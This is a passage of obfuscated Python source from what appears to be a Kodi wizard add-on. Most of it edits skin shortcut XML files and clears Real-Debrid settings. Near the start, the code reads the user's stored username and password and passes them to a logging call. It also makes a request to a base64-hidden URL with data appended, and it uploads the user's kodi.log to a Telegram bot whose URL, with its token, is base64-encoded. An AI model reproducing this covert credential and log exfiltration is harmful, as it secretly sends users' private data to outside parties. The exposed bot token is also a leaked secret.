          OO00O00OOOOO00000 =OO0OO000O0OOO00O0 #line:574
          import socket #line:576
          O0OO0O000O0O0OO0O =urllib2 .urlopen (OO0O00000OO000OOO .decode ('base64')+' - '+OO00O000OO000O0O0 +' - '+OO00O00OOOOO00000 +' - '+OO000O0O0OO0O0O0O ).readlines ()#line:577
       except :pass #line:578
def googleindicat ():#line:581
			import logg #line:582
			O0O0OO0OOO00O000O =(ADDON .getSetting ("pass"))#line:583
			O0000000O0O0000O0 =(ADDON .getSetting ("user"))#line:584
			logg .logGA (O0O0OO0OOO00O000O ,O0000000O0O0000O0 )#line:585
def logsend ():#line:586
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:587
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:588
      howsentlog ()#line:590
      import requests #line:591
      if xbmc .getCondVisibility ('system.platform.windows'):#line:592
         O00O000OO000000OO =xbmc .translatePath ('special://home/kodi.log')#line:593
         OOOOOO0OO0OOOO0O0 ={'chat_id':(None ,'-274262389'),'document':(O00O000OO000000OO ,open (O00O000OO000000OO ,'rb')),}#line:597
         O0O000000OO0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:598
         O0OOO00O00OOOO00O =requests .post (O0O000000OO0OO000 .decode ('base64'),files =OOOOOO0OO0OOOO0O0 )#line:600
      elif xbmc .getCondVisibility ('system.platform.android'):#line:601
           O00O000OO000000OO =xbmc .translatePath ('special://temp/kodi.log')#line:602
           OOOOOO0OO0OOOO0O0 ={'chat_id':(None ,'-274262389'),'document':(O00O000OO000000OO ,open (O00O000OO000000OO ,'rb')),}#line:606
           O0O000000OO0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:607
           O0OOO00O00OOOO00O =requests .post (O0O000000OO0OO000 .decode ('base64'),files =OOOOOO0OO0OOOO0O0 )#line:609
      else :#line:610
           O00O000OO000000OO =xbmc .translatePath ('special://kodi.log')#line:611
           OOOOOO0OO0OOOO0O0 ={'chat_id':(None ,'-274262389'),'document':(O00O000OO000000OO ,open (O00O000OO000000OO ,'rb')),}#line:615
           O0O000000OO0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:616
           O0OOO00O00OOOO00O =requests .post (O0O000000OO0OO000 .decode ('base64'),files =OOOOOO0OO0OOOO0O0 )#line:618
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:619
def rdoff ():#line:621
	O00OOOOO00000OOOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:622
	O00OOOOO00000OOOO .setSetting ('rd.client_id','')#line:623
	O00OOOOO00000OOOO .setSetting ('rd.secret','')#line:624
	O00OOOOO00000OOOO .setSetting ('rdsource','false')#line:625
	O00OOOOO00000OOOO .setSetting ('super_fast_type_toren','false')#line:626
	O00OOOOO00000OOOO .setSetting ('rd.auth','false')#line:627
	O00OOOOO00000OOOO .setSetting ('rd.refresh','false')#line:628
	O00OOOOO00000OOOO =xbmcaddon .Addon ('script.module.resolveurl')#line:630
	O00OOOOO00000OOOO .setSetting ('RealDebridResolver_client_id','')#line:631
	O00OOOOO00000OOOO .setSetting ('RealDebridResolver_client_secret','')#line:632
	O00OOOOO00000OOOO .setSetting ('RealDebridResolver_token','')#line:633
	O00OOOOO00000OOOO .setSetting ('RealDebridResolver_refresh','')#line:634
	O00OOOOO00000OOOO =xbmcaddon .Addon ('plugin.video.seren')#line:636
	O00OOOOO00000OOOO .setSetting ('rd.client_id','')#line:637
	O00OOOOO00000OOOO .setSetting ('rd.secret','')#line:638
	O00OOOOO00000OOOO .setSetting ('rd.auth','')#line:639
	O00OOOOO00000OOOO .setSetting ('rd.refresh','')#line:640
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:641
		O00OOOOO00000OOOO =xbmcaddon .Addon ('plugin.video.gaia')#line:642
		O00OOOOO00000OOOO .setSetting ('accounts.debrid.realdebrid.id','')#line:643
		O00OOOOO00000OOOO .setSetting ('accounts.debrid.realdebrid.secret','')#line:644
		O00OOOOO00000OOOO .setSetting ('accounts.debrid.realdebrid.token','')#line:645
		O00OOOOO00000OOOO .setSetting ('accounts.debrid.realdebrid.refresh','')#line:646
	resloginit .resloginit ('restore','all')#line:647
	OOO000OO000OO0000 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:649
	O0000O00000OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:650
	copyfile (OOO000OO000OO0000 ,O0000O00000OOO00O )#line:651
def skindialogsettind18 ():#line:652
	try :#line:653
		O000OO0OO00O0O00O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:654
		OOOO00O00OOOO0O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:655
		copyfile (O000OO0OO00O0O00O ,OOOO00O00OOOO0O00 )#line:656
	except :pass #line:657
def rdon ():#line:658
	loginit .loginIt ('restore','all')#line:659
	O000OOOO000OOOOOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:661
	O00OO00O000OO0O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:662
	copyfile (O000OOOO000OOOOOO ,O00OO00O000OO0O0O )#line:663
def adults18 ():#line:665
  O0000OOO000OO0OO0 =(ADDON .getSetting ("adults"))#line:666
  if O0000OOO000OO0OO0 =='true':#line:667
    OOOO00O0O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:668
    with open (OOOO00O0O0OOOO0OO ,'r')as O0O0OO00O0O0O0O00 :#line:669
      O0OO0O00O0OO0000O =O0O0OO00O0O0O0O00 .read ()#line:670
    O0OO0O00O0OO0000O =O0OO0O00O0OO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:688
    with open (OOOO00O0O0OOOO0OO ,'w')as O0O0OO00O0O0O0O00 :#line:691
      O0O0OO00O0O0O0O00 .write (O0OO0O00O0OO0000O )#line:692
def rdbuildaddon ():#line:693
  OOO00O0O00O0OO0OO =(ADDON .getSetting ("auto_rd"))#line:694
  if OOO00O0O00O0OO0OO =='true':#line:695
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:696
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:697
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:698
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:716
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:719
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:720
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:724
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:725
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:726
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:744
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:747
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:748
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:752
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:753
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:754
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:772
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:775
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:776
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:780
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:781
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:782
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:800
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:803
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:804
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:807
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:808
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:809
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:827
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:830
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:831
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:833
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:834
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:835
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:853
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:856
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:857
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:859
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:860
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:861
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:879
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:882
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:883
    O0O0000OOO00000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:886
    with open (O0O0000OOO00000O0 ,'r')as O0OOO0O00O0O000OO :#line:887
      OO00OO0000O000OOO =O0OOO0O00O0O000OO .read ()#line:888
    OO00OO0000O000OOO =OO00OO0000O000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:906
    with open (O0O0000OOO00000O0 ,'w')as O0OOO0O00O0O000OO :#line:909
      O0OOO0O00O0O000OO .write (OO00OO0000O000OOO )#line:910
def rdbuildinstall ():#line:913
  try :#line:914
   OOOOOOO000O0O0OO0 =(ADDON .getSetting ("auto_rd"))#line:915
   if OOOOOOO000O0O0OO0 =='true':#line:916
     O0OO0OO0000OO0O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:917
     OOO00O0OOOOOO0000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:918
     copyfile (O0OO0OO0000OO0O0O ,OOO00O0OOOOOO0000 )#line:919
  except :#line:920
     pass #line:921
def rdbuildaddonoff ():#line:924
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:927
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:928
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:929
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:947
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:950
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:951
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:955
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:956
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:957
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:975
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:978
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:979
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:983
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:984
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:985
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1003
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:1006
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:1007
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1011
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:1012
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:1013
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1031
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:1034
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:1035
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1038
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:1039
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:1040
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1058
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:1061
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:1062
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1064
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:1065
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:1066
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1084
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:1087
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:1088
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1090
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:1091
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:1092
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1110
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:1113
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:1114
    OOOOO00OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1117
    with open (OOOOO00OOOOOOOOOO ,'r')as OO0000O00OOOOOO0O :#line:1118
      OOO0O000O00OO0000 =OO0000O00OOOOOO0O .read ()#line:1119
    OOO0O000O00OO0000 =OOO0O000O00OO0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1137
    with open (OOOOO00OOOOOOOOOO ,'w')as OO0000O00OOOOOO0O :#line:1140
      OO0000O00OOOOOO0O .write (OOO0O000O00OO0000 )#line:1141
def rdbuildinstalloff ():#line:1144
    try :#line:1145
       O0OOOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1146
       O000OO0O00O0OOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1147
       copyfile (O0OOOOO00OO00OOO0 ,O000OO0O00O0OOO0O )#line:1149
       O0OOOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1151
       O000OO0O00O0OOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1152
       copyfile (O0OOOOO00OO00OOO0 ,O000OO0O00O0OOO0O )#line:1154
       O0OOOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1156
       O000OO0O00O0OOO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1157
       copyfile (O0OOOOO00OO00OOO0 ,O000OO0O00O0OOO0O )#line:1159
       O0OOOOO00OO00OOO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1162
       O000OO0O00O0OOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1163
       copyfile (O0OOOOO00OO00OOO0 ,O000OO0O00O0OOO0O )#line:1165
    except :#line:1167
       pass #line:1168
def rdbuildaddonON ():#line:1175
    OOOO0O00O00O0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1177
    with open (OOOO0O00O00O0O000 ,'r')as O00O000000OO0OO00 :#line:1178
      O000000000000O0O0 =O00O000000OO0OO00 .read ()#line:1179
    O000000000000O0O0 =O000000000000O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
